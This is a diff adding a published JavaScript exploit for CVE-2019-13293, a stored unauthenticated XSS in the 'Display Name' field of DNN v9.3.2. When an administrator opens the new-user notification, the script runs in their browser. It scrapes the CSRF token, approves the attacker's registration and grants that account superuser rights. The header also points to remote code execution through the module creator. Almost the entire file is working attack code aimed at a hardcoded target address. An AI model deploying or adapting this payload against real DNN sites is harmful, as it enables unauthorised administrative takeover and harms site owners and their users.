@@ -1,0 +1,204 @@
+/*
+Exploit Title: "Display Name" Stored Unauthenticated XSS in DNN v9.3.2
+Date: 4th of July, 2019
+Exploit Author: Semen Alexandrovich Lyhin
+Vendor Homepage: https://www.dnnsoftware.com/
+Software Link: https://github.com/dnnsoftware/Dnn.Platform/releases
+Version: v9.3.2
+CVE : CVE-2019-13293
+
+A malicious unauthenticated person can attempt to register a user with the XSS payload in "Display Name" parameter. 
+The administrator of the website will see a notification that a new user needs to be approved.
+An administrator should click on this notification, and the JavaScript code will be executed in the administrator's browser.
+
+This exploit adds the user, and grants him administrator priviliges. 
+
+A native module "module creator" also allows remote code execution. 
+
+*/
+
+
+
+function ApproveNotification(baseurl, id) {
+	return new Promise(function (resolve, reject) {	
+		var url = baseurl + "/Activity-Feed/Messages/";
+		var xhr = new XMLHttpRequest();
+		xhr.onreadystatechange = function () {
+			if (xhr.readyState == 4) {
+				var data;
+				if (!xhr.responseType === "text") {
+					data = xhr.responseText;
+				} else if (xhr.responseType === "document") {
+					data = xhr.responseXML;
+				} else {
+					data = xhr.response;
+				}
+
+				var parser = new DOMParser();
+				var resp = parser.parseFromString(data, "text/html");
+				token = resp.getElementsByName('__RequestVerificationToken')[0].value; //grab first available token
+				
+				var post_params = "NotificationId=" + id;
+				var x1 = new XMLHttpRequest();
+				
+				x1.open("POST", baseurl + "/API/InternalServices/NewUserNotificationService/Authorize");
+				x1.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=utf-8");
+				x1.setRequestHeader('RequestVerificationToken', token);
+				x1.send(post_params);
+				resolve();
+			}
+		}
+		xhr.open('GET', url, true);
+		xhr.send(null);
+	});
+}
+
+function MakeSuperAdmin(baseurl, id) {
+	return new Promise(function (resolve, reject) {	
+		var url = baseurl + "/Activity-Feed/Messages/";
+		var xhr = new XMLHttpRequest();
+		xhr.onreadystatechange = function () {
+			if (xhr.readyState == 4) {
+				var data;
+				if (!xhr.responseType === "text") {
+					data = xhr.responseText;
+				} else if (xhr.responseType === "document") {
+					data = xhr.responseXML;
+				} else {
+					data = xhr.response;
+				}
+
+				var parser = new DOMParser();
+				var resp = parser.parseFromString(data, "text/html");
+				token = resp.getElementsByName('__RequestVerificationToken')[0].value; //grab first available token
+				
+				var post_params = "null"
+				var x1 = new XMLHttpRequest();
+				
+				x1.open("POST", baseurl + "/API/PersonaBar/Users/UpdateSuperUserStatus?userId=" + id + "&setSuperUser=true");
+				x1.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=utf-8");
+				x1.setRequestHeader('RequestVerificationToken', token);
+				x1.send(post_params);
+				resolve();
+			}
+		}
+		xhr.open('GET', url, true);
+		xhr.send(null);
+	});
+}
+
+function GetNotification(baseurl, username, moduleid, tabid) {
+	return new Promise(function (resolve, reject) {	
+		var url = baseurl +"/dotnetnuke/Activity-Feed/Messages/"
+		var xhr = new XMLHttpRequest();
+		xhr.onreadystatechange = function () {
+			if (xhr.readyState == 4) {
+				var data;
+				if (!xhr.responseType === "text") {
+					data = xhr.responseText;
+				} else if (xhr.responseType === "document") {
+					data = xhr.responseXML;
+				} else {
+					data = xhr.response;
+				}
+
+				var parser = new DOMParser();
+				var resp = parser.parseFromString(data, "text/html");
+				token = resp.getElementsByName('__RequestVerificationToken')[0].value; //grab first available token
+				
+				var x1 = new XMLHttpRequest();
+				
+				x1.open("GET", baseurl + "/API/CoreMessaging/MessagingService/Notifications?afterNotificationId=-1&numberOfRecords=1000&_=1562677665517", true);
+				x1.setRequestHeader('ModuleId', moduleid);
+				x1.setRequestHeader('TabId', tabid);
+				x1.onreadystatechange = () => {
+					
+					if (x1.readyState == 4) {
+						if (!x1.responseType === "text") {
+							data = x1.responseText;
+						} else if (x1.responseType === "document") {
+							data = x1.responseXML;
+						} else {
+							data = x1.response;
+						}
+						
+						//console.log(JSON.parse(data));
+						data = JSON.parse(data);
+						
+						for (var key in data['Notifications']){
+							if (data['Notifications'][key]['Body'].includes(username)) {
+								resolve((data['Notifications'][key]['NotificationId']));
+							};
+						}
+						reject();
+					}
+				}
+				x1.send(null);
+			}
+		}
+		xhr.open('GET', url, true);
+		xhr.send(null);
+	});
+}
+
+function GetUserId(baseurl, username, tabid) {
+	return new Promise(function (resolve, reject) {	
+		var url = baseurl +"/dotnetnuke/Activity-Feed/Messages/"
+		var xhr = new XMLHttpRequest();
+		xhr.onreadystatechange = function () {
+			if (xhr.readyState == 4) {
+				var data;
+				if (!xhr.responseType === "text") {
+					data = xhr.responseText;
+				} else if (xhr.responseType === "document") {
+					data = xhr.responseXML;
+				} else {
+					data = xhr.response;
+				}
+
+				var parser = new DOMParser();
+				var resp = parser.parseFromString(data, "text/html");
+				token = resp.getElementsByName('__RequestVerificationToken')[0].value; //grab first available token
+				
+				var x1 = new XMLHttpRequest();
+				
+				x1.open("GET", baseurl + "/API/PersonaBar/Users/GetUsers?searchText=" + username + "&filter=0&pageIndex=0&pageSize=10&sortColumn=&sortAscending=false", true);
+				x1.setRequestHeader('TabId', tabid);
+				x1.onreadystatechange = () => {
+					if (x1.readyState == 4) {
+						if (!x1.responseType === "text") {
+							data = x1.responseText;
+						} else if (x1.responseType === "document") {
+							data = x1.responseXML;
+						} else {
+							data = x1.response;
+						}
+						
+						//console.log(data);
+						data = JSON.parse(data);
+					    resolve((data['Results'][0]['userId']));
+						
+						reject();
+					}
+				}
+				x1.send(null);
+			}
+		}
+		xhr.open('GET', url, true);
+		xhr.send(null);
+	});
+}
+
+
+async function main(){
+	var username = "nobody34567";
+	var baseurl = "http://192.168.18.10/dotnetnuke/";
+	var moduleid = "374"; 
+	var tabid = "27"; //It's default ID of the module and tab, that should be used to get notification id. We can also parse it from the webpage. 
+    var NotificationId = await GetNotification(baseurl, username, moduleid, tabid);
+	await ApproveNotification(baseurl, NotificationId);
+	var UserID = await GetUserId(baseurl, username, tabid);
+	MakeSuperAdmin(baseurl, UserID);
+}
+
+main();
